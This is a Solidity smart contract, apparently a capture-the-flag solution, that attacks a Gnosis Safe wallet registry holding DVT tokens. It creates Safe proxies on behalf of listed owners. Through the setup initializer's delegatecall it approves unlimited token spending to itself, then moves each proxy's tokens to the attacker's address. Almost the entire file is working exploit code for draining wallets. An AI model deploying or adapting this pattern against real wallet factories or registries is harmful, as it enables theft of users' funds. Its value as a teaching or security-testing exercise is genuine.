// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletAttacker is Ownable {
    GnosisSafeProxyFactory public factory;
    IProxyCreationCallback public walletRegistry;
    address public masterCopy;
    address public dvtTokenAddress;

    uint256 public salt;
    uint256 constant public STEP = 9421;

    address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);

	function _sendLogPayload(bytes memory payload) private view {
		uint256 payloadLength = payload.length;
		address consoleAddress = CONSOLE_ADDRESS;
		assembly {
			let payloadStart := add(payload, 32)
			let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)
		}
	}

    constructor(address _factoryAddress, address _masterCopy, address _walletRegistryAddress, address _dvtTokenAddress) {
        factory = GnosisSafeProxyFactory(_factoryAddress);
        masterCopy = _masterCopy;
        walletRegistry = IProxyCreationCallback(_walletRegistryAddress);
        dvtTokenAddress = _dvtTokenAddress;
    }

    function transferMax(address token, address spender) external {
        ERC20(token).approve(spender, type(uint256).max);
    }

    function createProxy(address[] calldata owners) public returns (address) {
        bytes memory data = abi.encodeWithSignature(
            "transferMax(address,address)",
            dvtTokenAddress, // token 
            address(this) // spender 
        );
        
        bytes4 selector = bytes4(keccak256(bytes("setup(address[],uint256,address,bytes,address,address,uint256,address)")));
        bytes memory initializer = abi.encodeWithSelector(
            selector,
            owners, // owners 
            1, // _threshold
            address(this), 
            data,
            address(0), // fallbackHandler
            address(0), // paymentToken,
            0, // payment, 
            payable(address(0)) // paymentReceiver 
        );

        salt += STEP;
        GnosisSafeProxy proxy = factory.createProxyWithCallback(
            masterCopy, // _singleton
            initializer, // initializer 
            salt, // saltNonce
            walletRegistry //callback 
        );

        return address(proxy);
    } 

    function attack(address[][] calldata owners2d, uint256 amount) public {
        for (uint256 i = 0; i < owners2d.length; ++i) {
            address proxy = createProxy(owners2d[i]);
            IERC20(dvtTokenAddress).transferFrom(proxy, owner(), amount);
        }
    }
}